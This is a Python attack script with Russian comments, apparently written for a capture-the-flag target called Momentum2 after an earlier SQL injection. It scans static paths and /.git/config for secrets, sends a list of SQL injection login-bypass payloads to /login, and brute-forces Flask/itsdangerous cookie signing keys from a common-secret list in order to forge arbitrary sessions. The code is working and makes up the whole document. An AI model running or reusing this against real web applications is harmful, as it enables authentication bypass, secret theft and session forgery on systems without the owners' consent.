#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Momentum2 — оставшиеся поверхности после SQLi в /promo/check.

  1. /static/app.js и другие статики: ищем эндпоинты, секреты, ключи.
  2. /login с правильным сигналом: сравниваем ЗАГОЛОВОК страницы, а не текст.
     Плюс инъекции в password и в оба поля сразу.
  3. Сессионная кука: разбираем (Flask/itsdangerous), пробуем подписать
     известными секретами и понять, подделывается ли сессия.

Запуск: python3 hunt.py            (BASE — дефолтный контейнер)
        M2_BASE=... python3 hunt.py
"""

import os
import re
import sys
import json
import hmac
import zlib
import hashlib
import base64
import urllib.parse
import http.client
import ssl

BASE = os.environ.get(
    "M2_BASE",
    "https://f8a5ecdac34f4197.xn--80aqf1ad.xn--r1aee.xn--80afol2bmm.xn--p1acf",
).rstrip("/")
U = urllib.parse.urlsplit(BASE)
HOST, PORT, TLS = U.hostname, U.port or 443, U.scheme == "https"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124 Safari/537.36"
PASS = "Pa55word!x"

try:
    sys.stdout.reconfigure(errors="replace")
except Exception:
    pass


def conn(timeout=25):
    if TLS:
        return http.client.HTTPSConnection(HOST, PORT, timeout=timeout,
                                           context=ssl.create_default_context())
    return http.client.HTTPConnection(HOST, PORT, timeout=timeout)


def get(path, cookie=""):
    c = conn()
    h = {"Host": HOST, "User-Agent": UA, "Accept": "*/*", "Connection": "close"}
    if cookie:
        h["Cookie"] = cookie
    try:
        c.request("GET", path, headers=h)
        r = c.getresponse()
        return r.status, r.read().decode("utf-8", "replace"), r.getheaders()
    except Exception as e:
        return 0, "%s: %s" % (type(e).__name__, e), []
    finally:
        try:
            c.close()
        except Exception:
            pass


def post(path, data, cookie=""):
    body = urllib.parse.urlencode(data)
    c = conn()
    h = {"Host": HOST, "User-Agent": UA, "Accept": "*/*",
         "Content-Type": "application/x-www-form-urlencoded", "Connection": "close"}
    if cookie:
        h["Cookie"] = cookie
    try:
        c.request("POST", path, body=body, headers=h)
        r = c.getresponse()
        return r.status, r.read().decode("utf-8", "replace"), r.getheaders()
    except Exception as e:
        return 0, "%s: %s" % (type(e).__name__, e), []
    finally:
        try:
            c.close()
        except Exception:
            pass


def title(html):
    m = re.search(r"<title>(.*?)</title>", html, re.S | re.I)
    return (m.group(1).strip() if m else "")[:60]


def set_cookies(hdrs):
    out = []
    for k, v in hdrs:
        if k.lower() == "set-cookie":
            out.append(v.split(";", 1)[0])
    return out


# ------------------------------------------------------- 1. статики

STATICS = ["/static/app.js", "/static/main.js", "/static/app.js.map",
           "/app.py", "/source", "/static/", "/.git/config", "/static/style.css"]


def hunt_statics():
    print("=" * 70)
    print("1. СТАТИКИ И ИСХОДНИКИ")
    print("=" * 70)
    for p in STATICS:
        st, body, _ = get(p)
        note = ""
        if st == 200 and len(body) > 20:
            note = "len=%d" % len(body)
            low = body.lower()
            for kw in ("secret", "secret_key", "session", "api/", "fetch(", "flag{", "password"):
                if kw in low:
                    note += " [%s]" % kw
        print("  %-22s %3s  %s" % (p, st, note))
        if st == 200 and p.endswith(".js") and len(body) > 20:
            eps = sorted(set(re.findall(r"['\"](/[a-z0-9_\-/\.]{3,40})['\"]", body)))
            if eps:
                print("      пути в js: %s" % eps[:25])
            for m in re.finditer(r"[\"']([^\"']{0,40}(?:secret|SECRET|key|KEY)[^\"']{0,40})[\"']", body):
                print("      подозрительное: %s" % m.group(1)[:80])


# ------------------------------------------------------- 2. логин

def hunt_login():
    print()
    print("=" * 70)
    print("2. /login — сигнал по ЗАГОЛОВКУ СТРАНИЦЫ")
    print("=" * 70)
    user = "h" + os.urandom(4).hex()
    st, base_login, _ = get("/login")
    print("  GET /login              -> %s  title=%r" % (st, title(base_login)))
    st, body, _ = post("/register", {"username": user, "password": PASS})
    print("  register %-12s -> %s  title=%r" % (user, st, title(body)))

    def probe(label, data):
        st, body, hdrs = post("/login", data)
        ck = set_cookies(hdrs)
        print("  %-34s -> %3s  title=%-24r cookie=%s"
              % (label[:34], st, title(body), "да" if ck else "нет"))
        return title(body), ck

    good, _ = probe("верный пароль", {"username": user, "password": PASS})
    bad, _ = probe("неверный пароль", {"username": user, "password": "wrong"})
    print("  --- дифференциал: верный=%r vs неверный=%r ---" % (good, bad))

    payloads = [
        ("' OR 1=1--", "x"),
        ("' OR 1=1-- -", "x"),
        ("' OR '1'='1", "' OR '1'='1"),
        (user, "' OR '1'='1"),
        (user, "x' OR '1'='1'--"),
        ("admin", "admin"),
        ("admin'--", "x"),
        ("' OR 1=1 LIMIT 1--", "x"),
        ("' UNION SELECT 1,2,3--", "x"),
        ("%' OR username LIKE '%", "x"),
    ]
    for u, p in payloads:
        t, ck = probe("u=%r" % u[:20], {"username": u, "password": p})


# ------------------------------------------------------- 3. сессия

COMMON = ["secret", "secretkey", "secret_key", "dev", "development", "flask",
          "changeme", "password", "momentum", "Momentum", "momentum2", "ctf",
          "flag", "super-secret", "super-secret-key", "your-secret-key", "test",
          "admin", "key", "1234", "s3cr3t", "supersecret", "momentum-secret",
          "MOMENTUM", "trader", "elite", "promo"]


def b64u_dec(s):
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s.encode())


def b64u_enc(b):
    return base64.urlsafe_b64encode(b).decode().rstrip("=")


def flask_derive(secret, salt=b"cookie-session"):
    return hmac.new(secret.encode(), salt, hashlib.sha1).digest()


def flask_sign(secret, value):
    return b64u_enc(hmac.new(flask_derive(secret), value.encode(), hashlib.sha1).digest())


def decode_payload(payload_b64):
    raw = b64u_dec(payload_b64)
    if raw[:1] == b".":
        try:
            raw = zlib.decompress(raw[1:])
        except Exception:
            pass
    try:
        return json.loads(raw.decode("utf-8", "replace"))
    except Exception:
        return raw[:200].decode("utf-8", "replace")


def hunt_session():
    print()
    print("=" * 70)
    print("3. СЕССИОННАЯ КУКА")
    print("=" * 70)
    user = "s" + os.urandom(4).hex()
    post("/register", {"username": user, "password": PASS})
    st, body, hdrs = post("/login", {"username": user, "password": PASS})
    jars = set_cookies(hdrs)
    print("  Set-Cookie при входе: %s" % (jars or "нет (сессия уже была в cookie)"))
    if not jars:
        print("  !! куки не выставились — сессия, вероятно, живёт в другом месте")
        return

    ck = jars[0]
    name, val = ck.split("=", 1)
    print("  имя куки: %s | длина значения: %d" % (name, len(val)))
    parts = val.split(".")
    print("  частей через точку: %d" % len(parts))
    if len(parts) >= 2:
        try:
            print("  payload: %s" % json.dumps(decode_payload(parts[0]), ensure_ascii=False)[:300])
        except Exception as e:
            print("  payload не разобрался: %s" % e)

    if len(parts) == 3:
        payload, ts, sig = parts
        value = payload + "." + ts
        print("  -> похоже на Flask/itsdangerous, пробую секреты...")
        for sec in COMMON:
            if flask_sign(sec, value) == sig:
                print("  *** СЕКРЕТ НАЙДЕН: %r ***" % sec)
                print("  теперь можно подписать ЛЮБУЮ сессию этим ключом")
                return
        print("  ни один из %d частых секретов не подошёл" % len(COMMON))
    else:
        print("  формат не itsdangerous — вероятно, свой signed cookie или обычный id")
        print("  значение: %r" % val[:120])


if __name__ == "__main__":
    hunt_statics()
    hunt_login()
    hunt_session()
